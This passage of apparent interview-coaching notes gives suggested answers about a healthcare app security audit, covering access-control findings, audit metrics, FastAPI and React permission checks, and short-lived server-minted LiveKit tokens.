**Say it like this:** "I mapped roles and PHI flows, tested every endpoint as every role and tenant, reviewed tokens and storage, fixed issues with tests, and re-audited."

---

**Q68. "What were the 8 critical issues?"**

**Short answer:** Describe only real ones, mapped to categories like UI-only RBAC, missing tenant scoping, tokens in localStorage, no rotation, long-lived tokens, PHI in logs or storage, and missing headers.

**Explanation:** Interviewers probe each one, so pick ones you understand deeply.

**Example:** "Three were access control, two token handling, two PHI exposure in logs and storage, and one missing security headers." *(Use your real breakdown.)*

**Say it like this:** "They fell into access control, token handling and PHI exposure; I can go deep on any of them."

---

**Q69. "What does 'cut findings by 85%' mean exactly?"**

**Short answer:** The number of open findings in the re-audit versus the initial audit.

**Explanation:** State whether it's a raw count or severity-weighted, and what remained.

**Example:** "40 open findings down to 6, all lower severity with owners and dates." *(Use your real numbers.)*

**Say it like this:** "It's open findings before and after, and the remaining ones were low severity and tracked."

---

**Q70. "How did you handle RBAC in FastAPI and React together?"**

**Short answer:** FastAPI enforced role, tenant and ownership on every route; React used the same permission list for navigation and buttons; a test matrix verified it.

**Explanation:** One source of truth for permissions kept frontend and backend consistent.

**Example:** `Depends(require_permission("calls:score"))` on the route; `can(role, 'calls:score')` in the UI.

**Say it like this:** "The server enforced, the UI reflected, and tests proved every role against every endpoint."

---

**Q71. "How are LiveKit tokens secured?"**

**Short answer:** Generated on the server per user and room, short-lived, with minimal grants, and opaque room names.

**Explanation:** The client never constructs tokens or sees the API secret.

**Example:** An interpreter's token allows publish and subscribe in one room for 10 minutes; an observer's allows subscribe only.

**Say it like this:** "Tokens are minted server-side with the least privilege each role needs and expire quickly."
